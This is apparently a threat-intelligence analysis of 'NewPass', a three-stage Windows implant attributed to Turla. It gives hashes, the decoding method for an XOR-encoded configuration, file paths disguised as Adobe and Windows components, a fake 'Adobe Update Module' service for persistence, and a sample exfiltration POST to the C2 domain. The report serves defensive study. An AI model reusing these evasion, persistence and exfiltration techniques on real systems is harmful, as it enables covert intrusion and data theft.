Recently Telsy observed some artifacts related to an attack that occurred in June 2020
that is most likely linked to the popular Russian Advanced Persistent Threat (APT) known
as Venomous Bear (aka Turla or Uroburos). At the best of our knowledge, this time
the hacking group used a previously unseen implant, that we internally named
“NewPass“ as one of the parameters used to send exfiltrated data to the command and
control.
Telsy suspects this implant has been used to target at least one European Union country
in the sector of diplomacy and foreign affairs.
NewPass is quite a complex malware composed by different components that rely on an
encoded file to pass information and configuration between each other. There are at least
three components of the malware: a dropper, that deploys the binary file; a loader library,

that is able to decode the binary file extracting the last component, responsible for
performing specific operations, such as communicate with the attackers’ command and
control server (the “agent”)
The loader and the agent share a JSON configuration resident in memory that
demonstrate the potential of the malware and the ease with which the attackers can
customize the implant by simply changing the configuration entries’ values.

Dropper Analysis
The first Windows library has a huge size, about 2.6 MB, and it is identified by the
following hash:
Type

Value

SHA256

e1741e02d9387542cc809f747c78d5a352e7682a9b83cbe210c09e2241af6078

Exploring the artifact using a static approach, it is possible to note that it exports a high
number of functions, as shown in the following image.

Most of the reported functions point to useless code and only LocalDataVer can be
used as an entry point of the DLL, therefore making it useful to understand the malicious
behavior.
Attackers used this trick likely to avoid sandbox analysis, as well as make manual analysis
slightly harder. Sandbox solutions, in fact, probably will try to execute a DLL file
using rundll32.exe or regsvr32.exe utilities, using “DllMain” or
“DllRegisterServer” as an entrypoint function. In this case, both these functions cause
the termination of the program, without showing the real malware behavior.
The library’s aim is to deploy the backdoor and its configuration file under two different
folders depending on attacker’s customization.

According to what has been observed by our research team, the paths used in this case are
the following:
Configuration Path

Backdoor Path

ProgramData\Adobe\ARM\Reader_20.021.210_47.dat

C:\Program Files
(x86)\Adobe\Acrobat Reader
DC\Reader\lib3DXquery.dll

ProgramData\WindowsHolographic\SpatialStore\Holo
graphicSpatialStore.swid

WindowsHolographicService.dll

For the second sample we weren’t able to retrieve its dropper. Therefore, it is possible to
obtain the location of the configuration file from which the backdoor tried to load the
parameters, but not the exact location in which the dropper deployed the implant artifact.
Furthermore, the used paths are very stealthy and it is easy to confuse the artifacts as
components of legitimate programs, such as Adobe Reader or Windows Mixed
Reality.
In particular, the path of the first sample is the same used by the legitimate Adobe Reader
installation and therefore the lib3DXquery.dll file matches up perfectly with the other
Adobe components, making it almost totally invisible.
The configuration file written, at first glance, seems to be totally encrypted and
incomprehensible without analyzing the next stage. The following image shows the
configuration file in its raw form.

Loader Analysis
The retrieved backdoor implants are identified by the following hashes:
Name

SHA256

lib3DXquery.dll

Once again, the libraries export several functions but only one is useful to execute their
real payload.

To begin, the library checks the presence of the associated configuration file, if it does not
exist, the backdoor terminates its execution. Vice versa, once found the file the malware
starts to decode and read the current configuration.
The first 5 bytes of the file contains the size of the data to read starting from
the 6th bytes and which contains the first encoded information useful to allow the
malware to load the entire configuration.
All the data retrieved in this first phase is encoded using a simple XOR algorithm with a
fixed key 19 B9 20 5A B8 EF 2D A3 73 08 C1 53, hardcoded at the beginning of the
function as represented in the following image.

So, the malware reads the first 5 bytes and decodes it using the key, obtaining the
number of the bytes it has to read to obtain the initial configuration.
In this specific case, from the decoded bytes it gets the value 00081.
So, it proceeds to read other next 81 bytes.

Decoding these last ones with the usual key, it obtains a string composed by different
parameters separated by “||”, as illustrated below.

However, this is still not the final configuration used by the malware, but it contains only
the parameters to load the last malicious Windows library, named
LastJournalx32.adf, containing the final agent.
This payload is hidden into the configuration file after a section of random bytes used by
the attackers to change the hash value of the file at every infection.

During its activity, the loader decrypts and maintains in memory the complete
configuration used during the infection chain.
It consists of different JSON formatted structures that look like the following:

{ “RefreshToken”:””, “NoInternetSleepTime”:”3600″, “GetMaxSize”:”60000″,
“ClientId”:””, “DropperExportFunctionName”:”LocalDataVer”, “Autorun”:”16″,
“ImgurImageDeletionTime”:”120″, “RecoveryServers”:[ ], “RunDllPath”:”%WinDir%\\System32″, “AgentLoaderExportFunctionName”:”LocalDataVer”,
“Key”:”[…redacted…]”, “AgentName”:”LastJournalx32.adf”, “UserAgent”:””,
[…truncated…]
The structure contains all the information necessary for the loader to correctly launch the
final agent. Some of these information are
AgentFileSystemName, AgentExportName and AgentName.
The agent shares the same memory space of the loader, thus it is able to access to the
same configuration and to extract the needed parameters, such as the object
named Credentials. It also contains the domain name (newshealthsport[.]com) and
the path (/sport/latest.php) of the command-and-control with which the agent will
communicate.
From the configuration it is also possible to notice the version number of the malware,
specifically it is 19.03.28 for the AgentLoader and 19.7.16 for the Agent.
Moreover, the agent is identified by an ID addressed by the AgentID entry that is used
during the communication with the C2 as identifier of the infected machine.
The configuration also embeds a specific structure for persistence mechanisms that
appears as follow:
{

“Autoruns”: {
“Service”: {
“DisplayName”: “Adobe Update Module”,
“ServiceName”: “Adobe Update Module”,
“Enabled”: “true”
},
“TaskScheduler”: {
“Enabled”: “false”
},
“Registry”: {
“Enabled”:
“false”
},
“Policies”: {
“Enabled”: “false”
} }}
The implant supports different types of persistence mechanisms: through Service
Manager, Task Scheduler, via Registry Key or using Windows GPO.
In this specific case, attackers enabled the Service method that allows the malware to
interact with the SCManager to create a new service named Adobe Update
Module pointing to the path of the loader.

The last payload is identified by the following hash:

It is responsible for exfiltrating information from the infected machine, sending it to the
command-and-control and downloading new commands to be executed.
To make the communication with the C2 stealthier, the agent uses a set of keywords to
separate the data within a POST request. The keywords are specified by attackers during
development phase.
In the analyzed case, they are the following:
dbnew
contentname
newpass
passdb
data_src
server_login
table_data
token_name
server_page
targetlogin
So, during the exfiltration phase, the HTTP requests appear as reported in the table below
POST /sport/latest.php HTTP/1.1 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0)
like Gecko Host: newshealthsport. com Content-Length: 170 Connection: KeepAlive newpass=[redacted]&server_page=[redacted]&passdb=[redacted]&targetlogin=t&table_data=[redacted]
All the values embedded into the request are encrypted, probably using one of the keys
embedded into the previous configuration. The algorithm used during the encryption
phase is most probably a custom one.
Below, we report a simple scheme of the described infection chain, highlighting the three
components of this new threat: the dropper, the loader and the agent.

Persistence
As mentioned above, the malware is able to create services or tasks or to add registry keys
to achieve persistence. In the analyzed case, the loader component is set to create a new
Windows service, specifying its path location as ImagePath.
